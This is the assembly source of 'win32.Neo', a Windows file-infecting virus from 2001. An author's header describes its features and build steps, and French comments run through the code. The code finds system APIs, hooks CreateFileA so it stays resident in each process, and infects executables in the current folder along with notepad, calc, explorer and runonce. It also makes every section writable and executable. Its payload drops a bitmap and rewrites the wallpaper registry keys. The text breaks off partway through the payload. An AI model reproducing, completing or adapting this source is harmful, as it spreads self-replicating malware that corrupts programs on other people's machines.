
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;                                                  Û      Û  ÛÛÛÛÛ   ÛÛÛÛÛ
; win32.Neo by TiPiaX/VDS - 2001                   Û      Û  Û    Û  Û
; Final Version                                    ÛÛ    ÛÛ  Û    Û  ÛÛÛÛÛ
;                                                   ÛÛ  ÛÛ   Û    Û      Û
; http://www.multimania.com/tipiax                   ßÛÛß    ÛÛÛÛÛ   ÛÛÛÛÛ
; vxer@caramail.com
;
; (win32.Neo = win32.Miam for AVP)
; I'm proud to present you my first real win32 virus.
; It's not a fantastic virus but i am not old in the scene so don't blame me.
; This virus uses per-process residency method in order to infect the files
; that the user uses the most.
;
; When the virus starts the first time, it looks in kernel32, user32, advapi32 and
; saves all the Apis adresses needed, then it infects all the current directory
; and files in the windows directory.
; The virus does not infect all the windows directory, it infects files like notepad.exe
; and calc.exe because infecting all this directory is not very stealth (it is slow).
; It infects the file Runonce.exe because this file is loaded before explorer.exe
; and it can infect the explorer.
; If it is the first generation, the virus displays a message.
;
; the virus increases last section when it infects a file.
; It infects only PE files, and it makes all sections read/write/exec.
; When the infected programm starts, the virus look in the Import Table
; and try to hook CreateFileA.
; When CreateFileA is hooked, the virus infect all the directory where the
; opened file is located.
; The infection mark is a little smiley in the file (i love that, it makes me
; think of a real life ;)
;
; Payload: the virus drops a bitmap file in the c:\ directory, then
; it changes screen background to black and shows the gfx "WAKE UP NEO" :p 
;
; I saw many per-process resident virus, but they never change the Import Table
; characteristics. And if the Import Table has not the flag write it will crash.
; someone said me it was always writeable but look in notepad.exe for example,
; it's not writeable.
; the section which contain the import table has not always the same name, so this
; virus changes all the sections characteristics to read/write/exec.
; I'm sorry but all the comments are in french. ( it's difficult for me
; to speak english )
;
; The virus erase few bytes of the first section of the executable with some code.
; this code jump to the virus with a jmp. The erased code is saved before in a
; buffer, and when the virus starts the original code is restored.
; There is a SEH in the infection proc.
;
;
; Greetz:
;
; #virus     : hello !
; #vxers     : My favorite channel
; #crack.fr  : where it all began
; #fcf       : where i can sleep :)
;
; QuantumG   : BIG GREETZ to you for testing this virus and saying me
;              what was wrong. Thx
; Mandag0re  : give me the knowledge !
; Bendi      : Thanks for your Clem Virus
; Del_Armg0  : i love Matrix
; Christal   : you are a cracking god
; Pointbat   : Where are you ?
; Drak       : my friend
; Androgyne  : VDS POWAAAAHHH
; Artif      : Don't stop cracking
; VirusBuster: Thanks for all
; Kahel      : Thanks for your help for Hccc!
; Nostra     : no, it's not the end of the world !
; CoolViper  : You are a cool guy :)
; LordJulus  : I learned with your tutorials
; MinoThauR  : you are just a legend ;)
; Analyst    : I hope you will enjoy this virus
; Lunatic    : Hack the planet
; MrPhilex   : I love your homepage ;)
; Sboub      : And your irc client ?
; Roy        : you are a really good coder
; Kerberos   : OpenGl Powaaaahhh
; Unk        : When will you write a virus ?
;
;
; just a little thing: Mist is a big shit !
;
; Pour compiler:
; tasm32 -ml -m5 -q neo.asm
; tlink32 -Tpe -aa -x -c neo.obj ,,,import32
; pewrsec neo.exe
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

.386
locals
jumps

.model flat, stdcall

extrn ExitProcess:NEAR
extrn MessageBoxA:NEAR

OPEN_EXISTING	equ	3
CREATE_ALWAYS	equ	2
GENERIC_WRITE	equ	40000000h
GENERIC_READ	equ	80000000h
LMEM_FIXED      equ	0
LMEM_ZEROINIT	equ	40h
LPTR		equ	LMEM_FIXED + LMEM_ZEROINIT

HKEY_CURRENT_USER	equ	80000001h
KEY_SET_VALUE           equ 2h
REG_SZ                  equ 1

TAILLE_VIRUS	equ	(offset fin_virus - offset start)
TAILLE_BMP	equ	(offset bitmap_end - offset bitmap_start)

                                               ;
filetime                        STRUC          ;
	FT_dwLowDateTime        DD ?           ; structure filetime
	FT_dwHighDateTime       DD ?           ;
filetime                        ENDS           ;
                                               ;
win32_find_data                 STRUC          ;
	FileAttributes          DD ?           ; les attributs
	CreationTime            filetime ?     ; date de création
	LastAccessTime          filetime ?     ; dernier acces
	LastWriteTime           filetime ?     ; derniere modification
	FileSizeHigh            DD ?           ; taille du fichier
	FileSizeLow             DD ?           ; taille du fichier
	Reserved0               DD ?           ;
	Reserved1               DD ?           ;
	FileName                DB 260 DUP (?) ; nom long de fichier
	AlternateFileName       DB 13 DUP (?)  ; nom court de fichier
                                DB 3 DUP (?)   ; padding
win32_find_data                 ENDS           ;

SYSTEMTIME			STRUC
	wYear			DW	  0
	wMonth			DW	  0
	wDayOfWeek		DW	  0
	wDay			DW	  0
	wHour			DW	  0
	wMinute			DW	  0
	wSecond			DW	  0
	wMilliseconds		DW	  0
SYSTEMTIME			ENDS


.data

signature	db	"Win32.Neo Virus by [TiPiaX/VDS]",0
petitmessage	db	"Miam ! I love PE files ;)",0

;===============================================================================
;
; Corps du programme
;
;===============================================================================

.code
start:
						;
	mov	edx, [esp]			; edx est une valeur du kernel
						;
	mov	ebx, offset start		; Calcul du delta offset : ebp = decalage
	sub	eax, ebx			; EntryPoint en eax au démarrage
	mov	ebp, eax			;
						;
	lea	eax, [ebp+RestoreHost]		; replace les bits virés avec l'epo
	call	eax				; et sauve la valeur de retour
	lea	eax, [ebp+GetKernel]		; choppe l'adresse du kernel
	call	eax				;
	lea	eax, [ebp+GetProcA]		; choppe l'adresse de GetProcAddress
	call	eax				;
	lea	eax, [ebp+GetAPIs]		; choppe les adresses des APIs voulues
	call	eax				;
	lea	eax, [ebp+GoResident]		; On se met resident (per-process)
	call	eax				;
	lea	eax, [ebp+Infecte_Dir]		; On part à l'infection
	call	eax				;
	lea	eax, [ebp+InfecteWinFiles]	; on se fait quelques fichiers dans windows
	call	eax				;
	lea	eax, [ebp+Payload]		; Le Payload
	call	eax				;
						;
goodbye:					;
	test	ebp, ebp			; exe de départ ?
	je	firstgen			; oui, on saute
	mov	eax, [ebp+THEENTRYPOINT]	; prend l'ancien entry point
	jmp	eax				; et on éxécute le prog hôte
						;
firstgen:					;

	call	MessageBoxA,0,offset petitmessage,offset signature,0
	call	ExitProcess,0


;===============================================================================
;	GetKernel PROC
;	input:		edx = adresse appartenant au kernel
;	output:		kernel32 et PeHeader
;===============================================================================

GetKernel PROC

	mov	eax,edx				; On sauve cette valeur dans eax
	AND	edx,0FFFF0000h			; On diminue la recherche
	inc edx					;
						;
boucle:						;
	dec	edx				; un cran de moins
	cmp	word ptr [edx], "ZM"		; Cherche le MZ Header
	jnz	boucle				; on repart
						;
MZ_found:					;
	mov	ecx, edx			; ecx = adresse du MZ.
	mov	ecx, [ecx+03ch]			; ecx = adresse du PE header
	add	ecx, edx			; on aligne
	cmp	ecx, eax			;
	jg	boucle				; vérifie que c'est une adresse valide
	cmp	word ptr [ecx] , "EP"		; On a le PeHeader ?
	jnz	boucle				; Non ! on repart
						;
	mov	[ebp+kernel32], edx		; stocke l'ImageBase du kernel
	mov	[ebp+PeHeader], ecx		; stocke L'ImageBase du PeHeader
						;
	ret
GetKernel endp

;===============================================================================
;	GetProcA PROC
;	input:		kernel32 et PeHeader
;	output:		AGetProcAddress = adresse de GetProcAddress
;	Succes : EAX = adresse de GetProcAddress	Failed : EAX = 0
;===============================================================================

GetProcA PROC

	mov	edi, [ebp+PeHeader]		; EDI = adresse du PeHeader
	mov	esi, [edi+78H]			; 78H = addresse de l'export table
	add	esi, [ebp+kernel32]		; on normalise
	mov	edi, [esi+12]			; adresse du nom du module
	add	edi, [ebp+kernel32]		; on normalise
	cmp	dword ptr [edi], "NREK"		; on a bien l'export table du Kernel ?
	jne	GetProcA_ERROR			;

	mov	eax, dword ptr [esi+1Ch]	; Tableau des Adresses des fonctions exportés
	add	eax, [ebp+kernel32]		; (EN DWORDS)
	mov	[ebp+Fonctions], eax		;
						;
	mov	eax, dword ptr [esi+20h]	; Adresses des noms des fonctions exportés
	add	eax, [ebp+kernel32]		;
	mov	[ebp+Names], eax		;
						;
	mov	eax, dword ptr [esi+24h]	; Tableau des exported oridinals
	add	eax, [ebp+kernel32]		; (EN WORDS)
	mov	[ebp+Ordinals], eax		;
						;
						;
	xor	eax, eax			; EAX sert de compteur
	mov	edx, [ebp+Names]		; EDX pointe une RVA
						;
Next_API:
						;
	cmp	dword ptr [edx], 0		; la dernière RVA ?
	je	GetProcA_ERROR			; erreur...
	mov	edi, [edx]			; EDI pointe le nom d'une API
	add	edi, [ebp+kernel32]		; on normalise
	lea	esi, [ebp+NGetProcAddress]	; ESI pointe le nom recherché
						;
compare:
	cmpsb					; les 2 bytes sont pareils ?
	jne	Inc_Compteur			; non ? on passe à la fonction suivante
	cmp	byte ptr [edi], 0		; la chaîne entière est valide
	je	GetProcA_Found			; -> héhé, on l'a !
	jmp	compare				; sinon on prend la prochaine lettre
						;
Inc_Compteur:
	inc	eax				; incrémente le compteur
	add	edx, 4				; prochaine RVA
	jmp	Next_API			; on recherche de nouveau
						;
GetProcA_Found:
						;
	imul	eax, 2				; multiplie le compteur par 2 (WORDS)
	add	eax, [ebp+Ordinals]		; choppe l'ordinal qui correspond
	movzx	eax, word ptr [eax]		; EAX = L'Ordinal
	imul	eax, 4				; multiplie l'Ordinal par 4 (DWORDS)
	add	eax, [ebp+Fonctions]		; Pointe l'adresse de GetProcAddress
	mov	eax, [eax]			; EAX = RVA de GetProcAddress
	add	eax, [ebp+kernel32]		; on normalise
	mov	[ebp+AGetProcAddress], eax	; Et on sauve l'adresse de GetProcAddress
						;
	ret					;
						;
GetProcA_ERROR:
	xor	eax, eax			;
	ret					;

GetProcA endp

;===============================================================================
;	GetAPIs	PROC
;	input:		AGetProcAddress = adresse de GetProcAddress
;===============================================================================

GetAPIs	PROC

;-------------------------------------------------------------------------------
; Fonction qui récupère toutes les APIs dont nous avons besoin
; dans Kernel32.dll
;-------------------------------------------------------------------------------

	lea	esi, [ebp+NExitProcess]		;
	lea	edi, [ebp+AExitProcess]		; On prépare la recherche des APIs
						;
find_apis:
						;
	push	esi				; Nom de l'API
	push	[ebp+kernel32]			; Module de Kernel32
	call	[ebp+AGetProcAddress]		; API qui nous donne
	test	eax, eax			; l'adresse de l'API recherchée
	je	on_se_trace			;
	stosd					; copie l'adresse là où pointe EDI
						; puis ajoute 4 à EDI
choppe_prochaine_api:				;
	inc	esi				; on choppe le prochain nom d'API
	cmp	byte ptr [esi], 0		;
	jne	choppe_prochaine_api		;
						;
	inc	esi				;
	cmp	byte ptr [esi], 0FFh		; On regarde si on est arrivé à la fin
	jne	find_apis			;

;-------------------------------------------------------------------------------
; Fonction qui récupère toutes les APIs dont nous avons besoin
; dans User32.dll
;-------------------------------------------------------------------------------

	lea	eax, [ebp+Nuser32]		; On prend l'ImageBase de user32.dll
	push	eax				; grace à GetModuleHandle.
	call	[ebp+AGetModuleHandleA]		;
	test	eax, eax			;
	je	on_se_trace			;
	mov	[ebp+user32],eax		; On stocke cette valeur dans user32.
						;
	lea	esi, [ebp+NMessageBoxA]		; On recherche en premier MessageBoxA
	lea	edi, [ebp+AMessageBoxA]		;
						;
find_user_apis:					;
						;
	push	esi				; On refait la même chose qu'avec Kernel32
	push	[ebp+user32]			; pour trouver toutes les adresses des APIs
	call	[ebp+AGetProcAddress]		; de user32.dll dont nous avons besoin
	test	eax, eax			;
	je	on_se_trace			;
	stosd					; copie l'adresse là où pointe EDI
						; puis ajoute 4 à EDI
choppe_user_api:				;
	inc	esi				; on choppe le prochain nom d'API
	cmp	byte ptr [esi], 0		;
	jne	choppe_user_api			;
						;
	inc	esi				;
	cmp	byte ptr [esi], 0FFh		; On regarde si on est arrivé à la fin
	jne	find_user_apis			;
						;

;-------------------------------------------------------------------------------
; Fonction qui récupère toutes les APIs dont nous avons besoin
; dans Advapi32.dll
;-------------------------------------------------------------------------------

	lea	eax, [ebp+NAdvapi32]		; On prend l'ImageBase de NAdvapi32.dll
	push	eax				; grace à GetModuleHandle.
	call	[ebp+AGetModuleHandleA]		;
	test	eax, eax			;
	je	on_se_trace			;
	mov	[ebp+advapi32],eax		; On stocke cette valeur dans advapi32.
						;
        lea     esi, [ebp+NRegOpenKeyExA]       ; On recherche en premier RegOpenKeyExA
        lea     edi, [ebp+ARegOpenKeyExA]       ;
						;
find_advapi_apis:                               ;
						;
	push	esi				; On refait la même chose qu'avec Kernel32
	push	[ebp+advapi32]			; pour trouver toutes les adresses des APIs
	call	[ebp+AGetProcAddress]		; de advapi32.dll dont nous avons besoin
	test	eax, eax			;
	je	on_se_trace			;
	stosd					; copie l'adresse là où pointe EDI
						; puis ajoute 4 à EDI
choppe_advapi_api:				;
	inc	esi				; on choppe le prochain nom d'API
	cmp	byte ptr [esi], 0		;
        jne     choppe_advapi_api               ;
						;
	inc	esi				;
	cmp	byte ptr [esi], 0FFh		; On regarde si on est arrivé à la fin
        jne     find_advapi_apis                ;
						;
	ret					;

on_se_trace:
	ret

GetAPIs	endp

;===============================================================================
;	GetImportedApi PROC
;	input  :	EDI = adresse du nom de l'api à rechercher
;	output :	EAX = adresse de l'API
;			EBX = pointeur sur l'adresse de l'API
;	Succes : EAX = adresse de l'API		Failed : EAX = 0
;===============================================================================

GetImportedApi PROC

	call	[ebp+AGetModuleHandleA], 0	; choppe l'ImageBase
	test	eax, eax			; failed ?
	je	GetImportedApi_ERROR		; erreur
	mov	[ebp+IMAGEBASE], eax		; On sauve la valeur

	mov	ecx, [ebp+IMAGEBASE]		; ImageBase du processus en ECX
	cmp	word ptr [ecx], 'ZM'		; vérification
	jne	GetImportedApi_ERROR
	movzx	ecx, word ptr [ecx+3Ch]		; on situe le PE Header
	add	ecx, [ebp+IMAGEBASE]		; on normalise
	cmp	word ptr [ecx], 'EP'		; vérification
	jne	GetImportedApi_ERROR
	mov	ecx, [ecx+80h]			; RVA de l' import table
	add	ecx, [ebp+IMAGEBASE]		; ECX pointe l'IMPORT TABLE (.idata)

k32search:

	mov	esi, ecx			; ESI = ECX = un IMPORT_DESCRIPTOR
	mov	esi, [esi+0ch]			; adresse de l' imported module ASCIIZ string
	add	esi, [ebp+IMAGEBASE]		; on normalise
	cmp	[esi], 'NREK'			; c'est l'IMPORT DESCRIPTOR du kernel ?
	je	k32found			; on a trouvé l'IMPORT_DESCRIPTOR du kernel
	add	ecx,14h				; ECX = Le prochain IMPORT_DESCRIPTOR
	jmp	k32search			; on repart

k32found:

	mov	esi, ecx			; ESI = kernel32 IMPORT DESCRIPTOR
	mov	ecx, [esi+10h]			; ECX = RVA de l'IMAGE_THUNK_DATA
	add	ecx, [ebp+IMAGEBASE]		; on normalise
	mov	[ebp+ITD], ecx			; IDT = adresse de l'IMAGE_THUNK_DATA
	mov	esi, [esi]			; ESI = pointeur sur le Characteristics
	test	esi, esi			; pas de Characteristics ?
	je	GetImportedApi_ERROR		; on quitte
	add	esi, [ebp+IMAGEBASE]		; on normalise

	xor	eax, eax			; EAX va servir de compteur
	mov	edx, esi			; EDX pointe sur Characteristics
	mov	ebx, edi			; sauve l'adresse du nom à chercher


IAT_Next_API:

	cmp	dword ptr [edx], 0		; la dernière RVA ?
	je	GetImportedApi_ERROR		; on quitte
        cmp     byte ptr [edx+3],80h		; Ordinal?
        je      IAT_Inc_Compteur		; suivant...
	mov	esi, [edx]			; ESI pointe le nom d'une API - 2
	add	esi, [ebp+IMAGEBASE]		; on normalise
	add	esi, 2				; ESI pointe le nom d'une API
	mov	edi, ebx			; EDI pointe le nom à chercher

IAT_compare:
	cmpsb					; les 2 bytes sont pareils ?
	jne	IAT_Inc_Compteur		; non ? on passe à la fonction suivante
	cmp	byte ptr [esi], 0		; la chaîne entière est valide
	je	IAT_API_Found			; -> héhé, on l'a !
	jmp	IAT_compare			; sinon on prend la prochaine lettre

IAT_Inc_Compteur:
	inc	eax				; incrémente le compteur
	add	edx, 4				; prochaine RVA
	jmp	IAT_Next_API			; on recherche de nouveau

IAT_API_Found:

	imul	eax, 4				; on multiplie le compteur par 4 (DWORDS)
	add	eax, [ebp+ITD]			; Pointe l'adresse de l'API
	mov	ebx, eax			; EBX = pointeur sur l'adresse de l'API
	mov	eax, [eax]			; EAX = adresse de l'API

	ret

GetImportedApi_ERROR:

	xor	eax, eax
	ret


GetImportedApi endp

;===============================================================================
;	GoResident PROC
;	Permet de hooker les APIs désirées et importées par l'hôte
;===============================================================================

GoResident PROC

	test	ebp, ebp			; Pas de résidence à la première génération
	je	GoResidentERROR			;
						;
	lea	edi, [ebp+NhookCreateFileA]	; On commence par hookCreateFileA
	lea	esi, [ebp+AhookCreateFileA]	;
	lea	edx, [ebp+_hookCreateFileA]	;
						;
GoResident_FINDAPI:

	push	edi				; On sauve tous les registres
	push	esi				;
	push	edx				;

	lea	eax, [ebp+GetImportedApi]	; On recherche les APIs dans l'IAT qu'on
	call	eax				; veut hooker, c'est la residence per-process

	pop	edx				; On restaure les registres
	pop	esi				;
	pop	edi				;

	test	eax, eax			; elle est pas dans l'IAT
	je	GoResident_NEXT			; On se prend la prochaine
	mov	[edx], eax			; sauve l'adresse de l'API
	mov	eax, [esi]			; choppe l'offset de notre code de substitution
	add	eax, ebp			; le normalise
	mov	[ebx], eax			; et l'installe dans l'IAT
						;
GoResident_NEXT:
	inc	edi				; on choppe le prochain nom d'API
	cmp	byte ptr [edi], 0		;
	jne	GoResident_NEXT			;
						;
	inc	edi				;
	add	esi, 4				; prochain offset
	add	edx, 4				; prochaine adresse de stockage
	cmp	byte ptr [edi], 0FFh		; On regarde si on est arrivé à la fin
	jne	GoResident_FINDAPI		;



GoResidentERROR:
ret

GoResident endp

;======= [HOOKED] ==============================================================

hookCreateFileA:

	pushad					; sauve tous les registres
	pushfd					; sauve les flags
						;
	mov     edx,[esp+40]                    ; Choppe le nom du fichier sur la pile
	mov	esi, edx			; Copie l'adresse dans esi
						;
	call	getdelta			; Calcul du delta offset
getdelta:					;
	pop	ebp				;
	sub	ebp, offset getdelta		;
						;
	lea	edi, [ebp+HookDirectory]	; buffer de copie
						;
copypath:					; copie le chemin dans le buffer HookDirectory
	lodsb					; choppe une lettre du chemin
	mov	byte ptr [edi], al		; copie la lettre dans le buffer
	inc	edi				; prochaine lettre
	test	al, al				; le 0 final ?
	jne	copypath			; sinon on boucle

	dec	edi				; edi pointe la fin du chemin copié (un 0)

WhereIsSlash:
	dec	edi				; 0 != \
	cmp	byte ptr [edi], "\"		; un \ ?
	jne	WhereIsSlash			; lettre précédente
	mov	byte ptr [edi], 0		; scalpe le buffer

	lea	edi, [ebp+Current_Dir]			; edi pointe un buffer
	call	[ebp+AGetCurrentDirectoryA], 260, edi	; sauve le chemin du rep courant

	lea	edi, [ebp+HookDirectory]		; edi pointe le dossier
	call	[ebp+ASetCurrentDirectoryA], edi	; on en fait le chemin par défaut
							;
	lea	eax, [ebp+Infecte_Dir]			;
	call	eax					; on infecte tout le dossier
							;
	lea	edi, [ebp+Current_Dir]			;
	call	[ebp+ASetCurrentDirectoryA], edi	; restaure le chemin courant

hookCreateFileA_ERROR:
	popfd
	popad

	call	getdeltaoffset			; Calcul du delta offset
getdeltaoffset:					;
	pop	eax				;
	sub	eax, offset getdeltaoffset	;
	jmp	[eax+_hookCreateFileA]		; quitte


;===============================================================================
;	Infecte_Dir PROC
;	Infects the current directory
;===============================================================================

Infecte_Dir PROC

	lea	ecx, [ebp+offset search]	; adresse de notre structure
	lea	eax, [ebp+exestr]		; String de recherche: *exe
	call	[ebp+AFindFirstFileA],eax,ecx	; cherche dans le répertoire courant
						;
	cmp	eax, 0FFFFFFFFh			; pas de fichier ?
	je	nofile				; oui ! on part.
						;
	mov	[ebp+SearchHandle],eax		; handle de la recherche en eax

encore:

	lea	eax, [ebp+InfectMe]		; Mouhahahahhahaha
	call	eax				; Gniak, on infecte toute le dossier
						; fichier par fichier.
	lea	edi, [ebp+search]		; adresse de notre structure
	lea	edi, [edi.FileName]		;
	mov	ecx, 13d			;
	mov	al, 0				; = ZeroMemory sur filename
	rep	stosb				;
						;
	lea	edi, [ebp+search]		; adresse de notre structure
	mov	eax, [ebp+SearchHandle]		; le handle
	call	[ebp+AFindNextFileA],eax,edi	; ;)
	test	eax, eax			; Y en a plus ?
	jne	encore				; si ! on repart à l'infection ;)
						;
	ret					; bye

nofile:

ret
Infecte_Dir endp

;===============================================================================
;	InfecteWinFiles PROC
;	Infects files in the windows directory
;===============================================================================

InfecteWinFiles PROC

	lea	esi, [ebp+Win_Dir]		;
	call	[ebp+AGetWindowsDirectoryA], esi, 260	;
						;
	lea	eax, [ebp+search]		; eax pointe la structure
	lea	edi, [eax.FileName]		; edi pointe FileName
						;
copie_dans_struct:				;
	cmp	byte ptr [esi] ,0		; Copie le chemin de windows
	je	concatene			;
	movsb					;
	jmp	copie_dans_struct		;
						;
concatene:					; Rajoute le nom du fichier
						;
; INFECTE NOTEPAD				;
						;
	mov	edx, edi			; sauve le pointeur edi dans edx
	mov	ecx, 13				; taille à copier
	lea	esi, [ebp+lenotepad]		; ESI pointe "\NOTEPAD.EXE",0
	rep	movsb				; concatène
	push	edx				; sauve EDX
	lea	eax, [ebp+InfectMe]		; Mouhahahahhahaha
	call	eax				; ET un notepad de vérolé
	pop	edx				; restaure EDX

; INFECTE CALC

	mov	edi, edx			; replace edi après le chemin de windows
	lea	esi, [ebp+lecalc]		; ESI pointe "\CALC.EXE",0
	mov	ecx, 10				; taille à copier
	rep	movsb				; concatène
	push	edx				; sauve EDX
	lea	eax, [ebp+InfectMe]		; Mouhahahahhahaha
	call	eax				; Et un Calc qui s'en prend plein le PE
	pop	edx				; restaure EDX

; INFECTE EXPLORER

	mov	edi, edx			; replace edi après le chemin de windows
	lea	esi, [ebp+leexplorer]		; ESI pointe "\EXPLORER.EXE",0
	mov	ecx, 14				; taille à copier
	rep	movsb				; concatène
	push	edx				; sauve EDX
	lea	eax, [ebp+InfectMe]		; Mouhahahahhahaha
	call	eax				; Et un Explorer qui s'en prend plein le PE
	pop	edx				; restaure EDX

; INFECTE RUNONCE

	lea	esi, [ebp+Sys_Dir]		;
	call	[ebp+AGetSystemDirectoryA], esi, 260	;
	lea	eax, [ebp+search]		; eax pointe la structure
	lea	edi, [eax.FileName]		; edi pointe FileName
						;
copie_sys_dans_struct:
	cmp	byte ptr [esi] ,0		; Copie le chemin de windows
	je	infectrunonce			;
	movsb					;
	jmp	copie_sys_dans_struct		;

infectrunonce:

	mov	ecx, 13				; taille à copier
	lea	esi, [ebp+lerunonce]		; ESI pointe "\RUNONCE.EXE",0
	rep	movsb				; concatène
	lea	eax, [ebp+InfectMe]		; Mouhahahahhahaha
	call	eax				; ET un runonce de vérolé

ret

InfecteWinFiles endp

;===============================================================================
;	InfectMe PROC
;	Infect a file specified in search.FileName
;===============================================================================

InfectMe PROC

	lea	eax, [ebp+SehError]		; On place un SEH
	push	eax				; pour éviter les plantages
	push	dword ptr FS:[0]		;
	mov	FS:[0], esp			;

	lea	edi, [ebp+search]		; edi pointe la structure
	lea	edx, [edi.FileName]		;

call	[ebp+ACreateFileA],edx,GENERIC_READ+GENERIC_WRITE,0,0,OPEN_EXISTING,0,0

	cmp	eax, -1				; On ouvre le fichier et on vérifie
	je	impossible			; qu'il n'y a pas d'erreurs
						;
	mov 	[ebp+handle], eax		; Prépare l'allocation de mémoire
	call	[ebp+AGetFileSize], eax , 0	;
	add	eax, TAILLE_VIRUS		; + taille du virus
	mov	[ebp+Fsize], eax		;

;----------------------------------------------------------------------
;---Alloue un espace memoire et inscrit le fichier dedans--------------
;----------------------------------------------------------------------

	call	[ebp+ALocalAlloc], LPTR, eax	; Réserve de la mémoire
	mov	edi, eax			; EDI = pointeur sur cette zone
						;
	lea	ecx, [ebp+byteread]		;
call	[ebp+AReadFile],[ebp+handle],edi,[ebp+Fsize],ecx,0  ;lecture du fichier

;----------------------------------------------------------------------
;---cherche la présence d'un MZ Header puis PE Header------------------
;----------------------------------------------------------------------

	cmp	word ptr [edi],'ZM'		; verification s'il s'agit bien d'un EXE
	jne	impossible			; Si erreur, on s'échappe
						;
	movzx	ecx, word ptr [edi+3Ch]		; adresse de l'adresse du PE Header
						;
	add	ecx, edi			; ebx pointe sur le PE Header
	cmp	word ptr[ecx], 'EP'		; verification s'il s'agit d'un PE Executable
	jne	impossible			;
						;
	cmp	word ptr [edi+38h], ');'	; vérifie que c'est pas déjà infecté
	je	impossible			;
						;
						; ECX = adresse du PeHeader
	mov	ebx, ecx			; EBX = adresse du PeHeader
						;
	movzx 	edx, word ptr [ecx+6]		; nombre de sections dans edx
	add	dword ptr[ecx+80],TAILLE_VIRUS	; on réajuste size_of_image
						;
	add	ecx, 248			; ecx pointe le section header
	mov	[ebp+secheader], ecx		; sauve cette valeur
						;
	mov	eax, edx			; nombre de section dans eax
						;
characboucle:
						;
	or	dword ptr [ecx+36], 0E0000020h	; Characterics : read/write/exec
	add	ecx, 40				; prochaine section
	dec	eax				; compteur
	test	eax, eax			; fini ?
	jne	characboucle			; sinon on boucle
						;
	sub	ecx, 40				; ECX POINTE SUR LA DERNIERE SECTION.
						;
	mov	eax, [ecx+16]			; raw size dans eax
	mov	edx, eax			; et dans edx
	add	dword ptr[ecx+16],TAILLE_VIRUS	; ajuste la raw size
						;
	add	edx, [ecx+12]			; EntryPoint = VirtualOffset+RawSize originale
	add	eax, [ecx+20]			; endroit où copier le virus = RawSize+RawOffset
						;
	mov	[ebp+return], edx		; sauve Le point d'entrée du virus (start:)
	mov 	esi, [ecx+16]			; nouvelle raw size
						;
	mov 	dword ptr [ecx+8], esi		; VirtualSize = SizeOfRawData
						;
	mov	ecx, dword ptr [ebx+40]		; ancien EntryPoint
	mov	[ebp+AENTRYPOINT], ecx		; on sauve l'ancien EntryPoint original
						;
	mov	edx, [ebp+AENTRYPOINT]		; EDX = valeur de l'entrypoint en RVA
						;
	mov	ecx, dword ptr [ebx+52]		; l'image base en ecx
  	add	[ebp+AENTRYPOINT], ecx		; on l'ajoute à l'ancien EntryPoint
	add	[ebp+return], ecx		; idem pour le point d'entrée du virus
						;
;sauve le code qu'on va écraser
						;
	mov	esi, edi			; esi pointe le MZ header
	add	esi, edx			; esi pointe le début du code de l'hôte
	mov	ecx, TAILLE_EPO			; la taille du code à injecter
	push	edi				; sauve pointeur du MZ Header 
	lea	edi, [ebp+savebytes]		; le buffer de destination
	rep	movsb				; copie le code de l'hôte
	pop	edi				; restaure pointeur du MZ Header
						;
;copie le code façon epo du virus dans l'hôte
						;
	push	edi				;
	lea	esi, [ebp+epo]			; esi pointe code à injecter
	add	edi, edx			; edi pointe l'entrypoint
	mov	ecx, TAILLE_EPO			; taille du code à injecter
	rep	movsb				; copie ce code
	pop	edi				;
						;
	mov	word ptr [edi+38h], ');'	; marque d'infection
	push	edi				;
	add	edi, eax			; endroit où copier le virus en virtual
	lea	esi, [ebp+start]		; pointeur sur le code à copier
	mov	ecx, TAILLE_VIRUS		; Nb de bytes à copier
	rep	movsb				; On copie le code viral
	pop	edi				;

call	[ebp+ASetFilePointer],[ebp+handle],0,0,0 ;Pointeur au début du fichier

	lea	eax, [ebp+byteread]		;
call	[ebp+AWriteFile],[ebp+handle], edi, [ebp+Fsize], eax, 0 ;ecrit les modifications
	test	eax, eax			;
	je	impossible			;
						;
impossible:

	pop	dword ptr FS:[0]		; Retire le SEH
	add	esp, 4h				; réajuste la pile
	call 	[ebp+ACloseHandle], [ebp+handle]; Fermeture du fichier
	call 	[ebp+ALocalFree], edx		; Liberation de la memoire
	ret

SehError:

	mov	esp, [esp+8]			; restaure esp
	pop	dword ptr FS:[0]		; Retire le SEH
	add	esp, 4h				; réajuste la pile
	call	getebp				; restaure ebp
getebp:	pop	ebp				;
	sub	ebp, offset getebp		;
	ret

InfectMe endp

;===============================================================================
;	Payload PROC
;	Change the wallpaper if time is 10h00
;===============================================================================
Payload PROC

	lea	eax, [ebp+time]			; EAX pointe la structure systemtime
	call	[ebp+AGetLocalTime],eax		; recupère les infos relatives au temps
						;
	cmp	word ptr [ebp+time+wHour], 10	; il est 10 heures ?
	jne	pasdepayload			;
						;
	cmp	word ptr [ebp+time+wMinute],0	; il est 10 h 00 ?
	jne	pasdepayload			;
						;
;ICI LE PAYLOAD

	lea	edx, [ebp+lebitmap]		;
	call	[ebp+ACreateFileA],edx,GENERIC_READ+GENERIC_WRITE,0,0,CREATE_ALWAYS,0,0
	test	eax, eax			; fichier crée ?
	je	pasdepayload			; non on quitte
						;
	mov 	[ebp+handle], eax		; Sauve le handle du fichier crée
						;
	lea	edi, [ebp+bitmap_start]		;
	lea	eax, [ebp+byteread]		;

	call	[ebp+AWriteFile],[ebp+handle],edi,TAILLE_BMP,eax,0	; écrit l'image

	test	eax, eax			; erreur de copie ?
	je	pasdepayload			; oui on quitte
						;
	call 	[ebp+ACloseHandle], [ebp+handle]; Fermeture du fichier

;Ici on a copié le fichier, maintenant on modifie la base de registre.

	lea	eax, [ebp+keyhandle]		; Ouvre la clé Control Panel\Desktop
	lea	edx, [ebp+keydesktop]		;
	call	[ebp+ARegOpenKeyExA], HKEY_CURRENT_USER, edx, 0, KEY_SET_VALUE, eax

;type = centré:

	lea	esi, [ebp+keytilevalue]		;
	lea	edi, [ebp+keytile]		;
	call	[ebp+ARegSetValueExA],[ebp+keyhandle],edi,0,REG_SZ,esi,2

;WallpaperStyle = 0:

	lea	esi, [ebp+keytilevalue]		;
	lea	edi, [ebp+keystyle]		;
	call	[ebp+ARegSetValueExA],[ebp+keyhandle],edi,0,REG_SZ,esi,2

;Wallpaper = c:\neo.bmp

	lea	esi, [ebp+lebitmap]		;
	lea	edi, [ebp+keyfile]		;
